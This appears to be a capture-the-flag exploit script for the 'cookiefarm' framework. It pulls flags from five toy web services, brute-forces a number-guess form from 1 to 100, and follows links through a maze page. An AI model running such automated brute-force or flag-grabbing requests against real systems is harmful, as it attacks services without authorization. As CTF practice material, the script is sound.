#!/usr/bin/env python3

from cookiefarm_exploiter import exploit_manager
import requests
from bs4 import BeautifulSoup


@exploit_manager
def exploit(ip:str, port:int, name:str):
    base_url = f"http://{ip}:{port}"

    # Service 1
    r = requests.get(f"{base_url}/get-flag")
    print(r.text)

    # Service 2
    r = requests.get(f"{base_url}/get-flag-sleep")
    print(r.text)

    # Service 3
    r = requests.get(f"{base_url}/get-flag-somewhere")
    print(r.text)

    # Service 4
    for i in range(1, 101):
        r = requests.post(f"{base_url}/get-flag-guess", data={"number": i})
        if "Congratulations" in r.text:
            print(r.text)
            break

    # Service 5
    r = requests.get(f"{base_url}/get-flag-maze")

    while True:
        soup = BeautifulSoup(r.content, 'html.parser')
        page:str = soup.find("a")["href"]
        r = requests.get(base_url + page)
        if "Congratulations" in r.text:
            print(r.text)
            break
